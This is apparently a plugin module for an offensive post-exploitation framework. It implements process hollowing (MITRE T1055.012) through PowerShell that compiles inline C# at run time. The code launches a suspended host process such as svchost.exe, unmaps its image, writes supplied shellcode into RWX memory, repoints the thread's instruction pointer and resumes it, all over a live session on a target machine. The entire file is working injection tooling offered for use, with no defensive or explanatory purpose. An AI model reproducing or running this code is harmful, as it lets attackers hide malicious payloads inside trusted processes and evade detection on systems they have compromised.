"""execution/process_hollow — process hollowing via inline C# Add-Type. MITRE T1055.012"""
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class ProcessHollow(BasePlugin):
    NAME        = "process_hollow"
    DESCRIPTION = "Create suspended process, unmap, write shellcode, resume. Params: target_process, payload_path."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1055.012"
    CATEGORY    = "execution"
    schema      = ParamSchema().add(
        Param("target_process", str, required=False, default="svchost.exe",
              help="Sacrificial host process (default: svchost.exe)"),
        Param("shellcode_b64",  str, required=False, default="",
              help="Base64-encoded shellcode to inject (mutually exclusive with payload_path)"),
        Param("payload_path",   str, required=False, default="",
              help="Path to shellcode binary on target (mutually exclusive with shellcode_b64)"),
    )

    @mitre("T1055.012")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")
        target  = params.get("target_process", "svchost.exe")
        sc_b64  = params.get("shellcode_b64", "").strip()
        sc_path = params.get("payload_path", "").strip()

        if not sc_b64 and not sc_path:
            return ModuleResult.err("Provide shellcode_b64 or payload_path")

        cs_code = r"""
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class Hollow {
    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO { public uint cb; public IntPtr r1,r2,r3; public int dX,dY,dXS,dYS,dXC,dYC,dwFillAtt; public uint dwFlags; public ushort wShowWnd,r4; public IntPtr r5,r6,r7,hStdIn,hStdOut,hStdErr; }
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION { public IntPtr hProcess,hThread; public uint dwPID,dwTID; }
    [StructLayout(LayoutKind.Sequential)]
    public struct CONTEXT64 { public ulong P1,P2,P3,P4,P5; public uint ContextFlags; [MarshalAs(UnmanagedType.ByValArray,SizeConst=6)] public uint[] Dr; [MarshalAs(UnmanagedType.ByValArray,SizeConst=512)] public byte[] ExtRegs; public ulong Dr6,Dr7,Rax,Rcx,Rdx,Rbx,Rsp,Rbp,Rsi,Rdi,R8,R9,R10,R11,R12,R13,R14,R15,Rip; }

    [DllImport("kernel32")] public static extern bool CreateProcess(string app,string cmd,IntPtr pa,IntPtr ta,bool inh,uint flags,IntPtr env,string cd,ref STARTUPINFO si,out PROCESS_INFORMATION pi);
    [DllImport("ntdll")]    public static extern int NtUnmapViewOfSection(IntPtr h, IntPtr addr);
    [DllImport("kernel32")] public static extern IntPtr VirtualAllocEx(IntPtr h,IntPtr a,uint s,uint t,uint p);
    [DllImport("kernel32")] public static extern bool WriteProcessMemory(IntPtr h,IntPtr a,byte[] b,uint s,out uint w);
    [DllImport("kernel32")] public static extern bool GetThreadContext(IntPtr h,ref CONTEXT64 ctx);
    [DllImport("kernel32")] public static extern bool SetThreadContext(IntPtr h,ref CONTEXT64 ctx);
    [DllImport("kernel32")] public static extern uint ResumeThread(IntPtr h);
    [DllImport("kernel32")] public static extern bool ReadProcessMemory(IntPtr h,IntPtr a,byte[] b,uint s,out uint r);
    [DllImport("kernel32")] public static extern bool CloseHandle(IntPtr h);

    public static string Run(string target, byte[] sc) {
        var si = new STARTUPINFO(); si.cb = (uint)Marshal.SizeOf(si);
        PROCESS_INFORMATION pi;
        // CREATE_SUSPENDED = 0x4
        if (!CreateProcess(null, target, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi))
            return "CreateProcess failed: " + Marshal.GetLastWin32Error();

        // Read PEB base address via GetThreadContext + ReadProcessMemory
        var ctx = new CONTEXT64(); ctx.ContextFlags = 0x10001B; // CONTEXT_FULL
        if (!GetThreadContext(pi.hThread, ref ctx))
            return "GetThreadContext failed";

        // PEB is at Rdx on x64
        var pebBuf = new byte[8];
        uint rd = 0;
        ReadProcessMemory(pi.hProcess, (IntPtr)ctx.Rdx, pebBuf, 8, out rd);
        IntPtr pebBase = (IntPtr)BitConverter.ToInt64(pebBuf, 0);

        // ImageBase is at PEB+0x10
        var imgBuf = new byte[8];
        ReadProcessMemory(pi.hProcess, (IntPtr)(pebBase.ToInt64() + 0x10), imgBuf, 8, out rd);
        IntPtr imgBase = (IntPtr)BitConverter.ToInt64(imgBuf, 0);

        // Unmap existing image
        NtUnmapViewOfSection(pi.hProcess, imgBase);

        // Allocate RWX region for shellcode
        IntPtr mem = VirtualAllocEx(pi.hProcess, imgBase, (uint)sc.Length, 0x3000, 0x40);
        if (mem == IntPtr.Zero)
            mem = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
        if (mem == IntPtr.Zero) { CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return "VirtualAllocEx failed"; }

        uint wr = 0;
        WriteProcessMemory(pi.hProcess, mem, sc, (uint)sc.Length, out wr);

        // Set RIP to shellcode entry
        ctx.Rip = (ulong)mem.ToInt64();
        SetThreadContext(pi.hThread, ref ctx);
        ResumeThread(pi.hThread);

        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return "Hollowed PID=" + pi.dwPID + " base=0x" + mem.ToString("X");
    }
}
"""
        # Build shellcode loading block
        if sc_b64:
            sc_load = f"$sc = [Convert]::FromBase64String('{sc_b64}');"
        else:
            sc_load = f"$sc = [System.IO.File]::ReadAllBytes('{sc_path}');"

        ps = (
            "$cs = @\"\n" + cs_code + "\n\"@\n"
            + "try { Add-Type $cs -EA Stop } catch { Write-Output \"Add-Type: $_\"; return }\n"
            + sc_load
            + f"[Hollow]::Run('{target}', $sc)"
        )
        r = ctx.ps(ps)
        if r["status"] != "ok":
            return ModuleResult.err(r["output"])
        return ModuleResult.ok(data=r["output"])
